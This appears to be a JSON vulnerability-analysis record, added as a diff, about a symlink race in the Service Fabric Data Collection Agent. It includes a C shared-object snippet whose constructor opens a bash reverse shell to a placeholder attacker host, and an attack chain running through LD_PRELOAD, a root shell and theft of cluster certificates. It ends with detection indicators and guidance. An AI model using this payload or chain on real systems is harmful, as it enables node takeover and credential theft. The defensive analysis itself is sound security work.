@@ -1,0 +1,115 @@
+{
+  "package_info": {
+    "package_name": "Data Collection Agent (DCA)",
+    "package_manager": "Microsoft Service Fabric (internal component, not a public package manager)",
+    "package_versions": "Versions prior to the June 14, 2022 patch (exact versions not specified)",
+    "why_malicious": "The DCA component contains a race condition vulnerability in its GetIndex function, which can be exploited by attackers to perform arbitrary file writes on the host node from within a Linux container. This enables privilege escalation to root, arbitrary code execution, and full node compromise by allowing attackers to overwrite critical files and execute malicious code."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "At runtime, when DCA processes log directory paths provided by the container or user input",
+        "file_location": "GetIndex function in DCA source code (exact file path not specified in report)",
+        "required_permissions": [
+          "filesystem write access to log directories",
+          "ability to create or manipulate symlinks in log directories"
+        ]
+      },
+      "code_snippet": "GetIndex(file_path) {\n  // Reads file, checks content format\n  // Modifies and overwrites content\n  // Vulnerable to symlink race\n}",
+      "code_language": "pseudo-code (original likely C/C++)",
+      "code_behavior": "At runtime, when DCA processes log directory paths, the function reads a file, checks its content format, and then overwrites the file without securely handling symlinks, allowing attacker-controlled symlinks to redirect the write to an arbitrary file, resulting in arbitrary file overwrite on the host.",
+      "malice_analysis": {
+        "why_suspicious": "The function overwrites files based on paths that can be manipulated by attacker-controlled symlinks, enabling arbitrary file writes outside the intended directory. This allows attackers to overwrite sensitive system files or place malicious files on the host.",
+        "violated_expectations": "Normal behavior would restrict file writes to validated, non-symlinked paths within the application's log directory and would explicitly check for and avoid following symlinks. The actual behavior allows file overwrites to any location the attacker can symlink to, violating standard security practices.",
+        "similar_legitimate_use": "Legitimate log rotation or file update functions may overwrite files, but only after verifying the file path is not a symlink and is within a safe, expected directory. Proper implementations use O_NOFOLLOW or similar flags to prevent symlink abuse.",
+        "key_indicators": [
+          "Absence of symlink checks (e.g., not using O_NOFOLLOW) before file overwrite",
+          "File write operations based on attacker-controlled input or symlinked paths",
+          "Ability to overwrite files outside the intended log directory",
+          "Race condition between file existence check and file write"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "At process startup, when a process is launched with the LD_PRELOAD environment variable set to the attacker-controlled shared object",
+        "file_location": "Attacker-written shared object file placed on the host filesystem (e.g., /tmp/malicious.so)",
+        "required_permissions": [
+          "filesystem write access to place shared object",
+          "ability to set environment variables (LD_PRELOAD)",
+          "network access to connect to external IP/port"
+        ]
+      },
+      "code_snippet": "/* malicious.so */\n__attribute__((constructor)) void init() {\n  system(\"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'\");\n}",
+      "code_language": "C",
+      "code_behavior": "At process startup, when a process is launched with LD_PRELOAD set to the malicious shared object, the constructor function executes a system call that spawns a reverse shell to the attacker's server, sending a root shell to an external IP and enabling remote code execution as root.",
+      "malice_analysis": {
+        "why_suspicious": "The shared object is specifically crafted to execute a reverse shell upon loading via the constructor attribute, which is a well-known post-exploitation technique for gaining remote access.",
+        "violated_expectations": "Normal shared objects do not contain constructor functions that execute shell commands or initiate outbound network connections. Legitimate libraries use constructors for initialization, not for spawning shells or connecting to external servers.",
+        "similar_legitimate_use": "Debugging or instrumentation libraries may use constructors for setup tasks, but never to execute shell commands or establish network connections to untrusted endpoints.",
+        "key_indicators": [
+          "Use of __attribute__((constructor)) to trigger code execution on library load",
+          "Presence of system() or exec*() calls in constructor functions",
+          "Reverse shell command embedded in shared object",
+          "LD_PRELOAD set to a writable or non-standard path (e.g., /tmp/malicious.so)",
+          "Outbound network connection initiated immediately upon process start"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker exploits the race condition in DCA's GetIndex function to overwrite an arbitrary file on the host node by creating a symlink from a log file to a target file.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Ability to place a malicious shared object (e.g., /tmp/malicious.so) or overwrite critical system files on the host filesystem."
+    },
+    {
+      "step": 2,
+      "action": "Attacker sets the LD_PRELOAD environment variable to point to the malicious shared object, ensuring it is loaded by a privileged process.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Execution of attacker-controlled code as root when the process starts."
+    },
+    {
+      "step": 3,
+      "action": "Malicious shared object executes its constructor function, which spawns a reverse shell connecting to the attacker's server.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker gains interactive root shell access to the node, enabling further actions."
+    },
+    {
+      "step": 4,
+      "action": "Attacker uses root access to extract sensitive files such as cluster certificates and configuration, and uses these to authenticate to Service Fabric API endpoints.",
+      "implemented_by": [],
+      "leads_to": "Full cluster compromise, lateral movement, and potential persistence."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Repeated file access and overwrites in log directories by the DCA process, especially with rapid succession",
+      "Creation or manipulation of symlinks in log or configuration directories immediately before file overwrites",
+      "Processes started with LD_PRELOAD set to shared objects located in writable or non-standard directories (e.g., /tmp/)",
+      "Shared objects containing constructor functions that execute shell commands or initiate outbound network connections",
+      "Unexpected privilege escalation or new root shells spawned on Service Fabric nodes"
+    ],
+    "file_indicators": [
+      "Presence of attacker-controlled shared objects in writable locations (e.g., /tmp/malicious.so)",
+      "Unusual or recently created symlinks in log or configuration directories pointing to sensitive files",
+      "Unexpected modifications to system files or configuration files by the DCA process",
+      "LD_PRELOAD environment variable set in process environments referencing non-standard paths"
+    ],
+    "network_indicators": [
+      "Outbound TCP connections from Service Fabric nodes to unknown or external IP addresses and ports (indicative of reverse shell activity)",
+      "Unusual network traffic patterns or connections initiated immediately after DCA file overwrite activity",
+      "Connections to IPs or ports not associated with normal cluster operations"
+    ],
+    "how_to_detect": "Monitor DCA process activity for repeated file overwrites and symlink usage in log directories. Alert on creation or modification of symlinks in log/config directories, especially if followed by file overwrites. Detect processes started with LD_PRELOAD set to shared objects in writable or non-standard locations. Scan shared objects for constructor functions that execute shell commands or initiate network connections. Monitor for outbound TCP connections from Service Fabric nodes to external IPs, particularly following DCA activity or privilege escalation events. Correlate file, process, and network events to identify the attack chain."
+  }
+}
